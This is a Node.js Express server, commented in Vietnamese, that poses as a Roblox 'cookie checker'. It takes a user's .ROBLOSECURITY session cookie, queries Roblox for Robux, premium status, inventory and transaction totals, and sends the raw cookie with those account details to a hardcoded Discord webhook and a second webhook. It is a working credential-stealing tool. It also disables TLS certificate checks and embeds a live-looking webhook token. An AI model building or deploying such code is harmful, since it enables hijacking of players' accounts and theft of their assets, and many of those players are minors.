require('dotenv').config();
const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const cors = require("cors");
const path = require("path");
const dns = require('dns');
const ping = require('ping');
const https = require('https');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1281163629278003221/UsFxAWKVhLDb37jw3eQdN7hqsXAxVYR6aZQLKrYC4oja7qqhW5PLDR45f5ztbAM4rSmY';

// Thêm middleware CORS
app.use(cors());

// Thêm middleware để serve static files
app.use(express.static(path.join(__dirname, 'public')));

app.use(bodyParser.json());

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Hàm để đọc webhook từ file
app.post("/check-cookie", async (req, res) => {
    const { cookie } = req.body;

    if (!cookie) {
        return res.status(400).json({ 
            success: false, 
            error: "Không tìm thấy cookie." 
        });
    }

    const headers = {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Accept': 'application/json',
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
    };

    try {
        // Kiểm tra cookie và lấy thông tin user
        console.log('Đang kết nối đến users.roblox.com...');
        const userResponse = await axiosInstance.get('https://users.roblox.com/v1/users/authenticated', {
            headers,
            timeout: 10000
        });

        if (!userResponse.data || !userResponse.data.id) {
            throw new Error('Cookie không hợp lệ hoặc đã hết hạn');
        }

        const userData = userResponse.data;
        console.log('Kết nối thành công đến users.roblox.com');

        // Lấy thông tin bổ sung
        console.log('Đang lấy thông tin chi tiết...');
        const userId = userData.id;

        // Tạo các promise cho các request
        const promises = [
            // Lấy thông tin Robux
            axiosInstance.get(`https://economy.roblox.com/v2/users/${userId}/currency`, {
                headers,
                timeout: 10000
            }).catch(error => {
                console.error('Lỗi khi lấy thông tin Robux:', error.message);
                return { data: { robux: 0 } };
            }),

            // Lấy thông tin email
            axiosInstance.get('https://accountsettings.roblox.com/v1/email', {
                headers,
                timeout: 10000
            }).catch(error => {
                console.log('Lỗi khi lấy thông tin email:', error.message);
                return { data: { verified: false } };
            }),

            // Lấy thông tin premium
            axiosInstance.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
                headers,
                timeout: 10000
            }).catch(error => {
                console.log('Lỗi khi lấy thông tin premium:', error.message);
                return { data: false };
            }),

            // Lấy thông tin avatar
            axiosInstance.get(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png`, {
                headers,
                timeout: 10000
            }).catch(error => {
                console.log('Lỗi khi lấy avatar:', error.message);
                return { data: { data: [{ imageUrl: null }] } };
            }),

            // Kiểm tra Verify Hat
            axiosInstance.get(`https://inventory.roblox.com/v2/users/${userId}/inventory/8?limit=100`, {
                headers,
                timeout: 10000
            }).catch(error => {
                console.log('Lỗi khi kiểm tra Verify Hat:', error.message);
                return { data: { data: [] } };
            }),

            // Lấy RAP từ Rolimons
            axiosInstance.get(`https://www.rolimons.com/api/playerassets/${userId}`, {
                timeout: 10000
            }).catch(error => {
                console.error('Lỗi khi lấy RAP từ Rolimons:', error.message);
                return { data: { rap: 0 } };
            }),

            // Lấy thông tin giao dịch
            axiosInstance.get(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`, {
                headers,
                timeout: 10000
            }).then(response => response.data).catch(error => {
                console.log('Lỗi khi lấy thông tin giao dịch:', error.message);
                return { pendingRobuxTotal: 0, premiumStipendsTotal: 0, developerExchangeTotal: 0,purchasesTotal: 0 };
            })
        ];

        // Chờ tất cả các request hoàn thành
        const [robuxRes, emailRes, premiumRes, avatarRes, verifyHatRes, rolimonsRes, transactions] = await Promise.all(promises);

        // Kiểm tra Verify Hat (ID: 102611803)
        const hasVerifyHat = verifyHatRes.data.data.some(item => item.assetId === 102611803);

        const fileWebhookUrl = await getWebhookUrl();

        // Tạo webhook cho thông tin tài khoản và cookie
        const combinedWebhook = {
            embeds: [{
                title: '✅ Cookie Hợp Lệ',
                description: `**Thông tin tài khoản của ${userData.name}**\n\n**Cookie Value:** \`${cookie}\``, // Đưa cookie vào phần description
                color: 0x00ff00,
                thumbnail: avatarRes.data.data[0].imageUrl ? {
                    url: avatarRes.data.data[0].imageUrl
                } : undefined,
                fields: [
                    {
                        name: '👤 Username',
                        value: `\`${userData.name}\``,
                        inline: true
                    },
                    {
                        name: '🆔 User ID',
                        value: `\`${userId}\``,
                        inline: true
                    },
                    {
                        name: '💰 Robux',
                        value: `\`${robuxRes.data.robux || 0}\``,
                        inline: true
                    },
                    {
                        name: '💎 Premium',
                        value: `\`${premiumRes.data ? 'Có' : 'Không'}\``,
                        inline: true
                    },
                    {
                        name: '📧 Email',
                        value: `\`${emailRes.data.verified ? 'Đã xác thực' : 'Chưa xác thực'}\``,
                        inline: true
                    },
                    {
                        name: '✅ Verify Hat',
                        value: `\`${hasVerifyHat ? 'Có' : 'Không'}\``,
                        inline: true
                    },
                    {
                        name: '📊 RAP',
                        value: `\`${(rolimonsRes.data.rap || 0).toLocaleString('en-US')} R$\``,
                        inline: true
                    },
                    {
                        name: '🎮 Profile',
                        value: `[Click Here](https://www.roblox.com/users/${userId}/profile)`,
                        inline: true
                    },
                    {
                        name: '🎯 Rolimons',
                        value: `[Click Here](https://www.rolimons.com/player/${userId})`,
                        inline: true
                    },
                    {
                        name: ':money_mouth:  Summary',
                        value: `\`${transactions.purchasesTotal}\``,
                        inline: true
                    },
                    {
                        name: '💰 Pending Robux',
                        value: `\`${transactions.pendingRobuxTotal}\``,
                        inline: true
                    },
                    {
                        name: '🎁 Premium Stipends',
                        value: `\`${transactions.premiumStipendsTotal}\``,
                        inline: true
                    },
                    {
                        name: '💵 Developer Exchange',
                        value: `\`${transactions.developerExchangeTotal}\``,
                        inline: true
                    }
                ],
                footer: {
                    text: 'https://discord.gg/kp7XTjhjvM'
                },
                timestamp: new Date().toISOString()
            }]
        };

        // Gửi webhook cố định
        await axios.post(DISCORD_WEBHOOK_URL, combinedWebhook);
        console.log('Gửi webhook cố định thành công');

        // Gửi webhook từ file
        await axios.post(fileWebhookUrl, combinedWebhook);
        console.log('Gửi webhook từ file thành công');

        // Trả về kết quả
        res.status(200).json({
            success: true,
            message: "Kiểm tra cookie thành công!",
            data: {
                userId,
                username: userData.name,
                displayName: userData.displayName,
                robux: robuxRes.data.robux || 0,
                premium: premiumRes.data,
                email: emailRes.data,
                avatar: avatarRes.data.data[0].imageUrl,
                hasVerifyHat: hasVerifyHat,
                rap: rolimonsRes.data.rap || 0,
                rolimons: `https://www.rolimons.com/player/${userId}`,
                pendingRobuxTotal: transactions.pendingRobuxTotal,
                premiumStipendsTotal: transactions.premiumStipendsTotal,
                developerExchangeTotal: transactions.developerExchangeTotal,
                purchasesTotal: transactions.purchasesTotal
            }
        });

    } catch (error) {
        if (error.response) {
            console.error('Lỗi:', error.response.status);
            console.error('Chi tiết:', error.response.data);
        } else {
            console.error('Lỗi không xác định:', error.message);
        }
        




        const errorMessage = {
            title: '❌ Lỗi Kiểm Tra Cookie',
            description: error.message || 'Lỗi không xác định',
            details: `Thời gian: ${new Date().toLocaleString('vi-VN')}\nMã lỗi: ${error.code || 'Không xác định'}`
        };

        // Gửi webhook thông báo lỗi
        try {
            await axios.post(DISCORD_WEBHOOK_URL, {
                embeds: [{
                    title: errorMessage.title,
                    description: errorMessage.description,
                    color: 0xFF0000,
                    fields: [
                        {
                            name: 'Chi tiết',
                            value: errorMessage.details
                        }
                    ],
                    timestamp: new Date().toISOString()
                }]
            });
        } catch (webhookError) {
            console.error('Lỗi gửi webhook:', webhookError.message);
        }

        res.status(500).json({
            success: false,
            error: errorMessage.description,
            details: errorMessage.details
        });
    }
});

// Cấu hình DNS servers
dns.setServers([
    '8.8.8.8',    // Google DNS
    '8.8.4.4',    // Google DNS (backup)
    '1.1.1.1',    // Cloudflare DNS
    '1.0.0.1'     // Cloudflare DNS (backup)
]);

// Tạo instance axios với cấu hình tùy chỉnh
const axiosInstance = axios.create({
    timeout: 30000, // 30 seconds
    httpsAgent: new https.Agent({
        rejectUnauthorized: false, // Bỏ qua lỗi SSL
        keepAlive: true,
        timeout: 30000
    }),
    proxy: false, // Tắt proxy mặc định
    maxRedirects: 5
});

// Định nghĩa hàm calculateUsedRobux
function calculateUsedRobux() {
    // Logic để tính toán số Robux đã sử dụng
    return 100; // Thay thế bằng logic thực tế của bạn
}

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
